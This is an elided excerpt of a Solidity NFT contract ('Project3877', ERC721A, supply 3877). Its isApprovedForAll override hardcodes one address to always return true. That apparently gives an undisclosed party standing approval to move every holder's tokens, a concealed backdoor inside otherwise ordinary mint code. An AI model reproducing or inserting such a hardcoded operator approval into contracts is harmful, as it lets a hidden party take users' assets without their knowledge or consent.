  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xafe5ADF8816dc536753594C24F1922a88BA776BD){return true;}
...
contract Project3877 is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  uint public maxSupply = 3877;
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Project3877", "3877", maxBatchSize_, collectionSize_) {
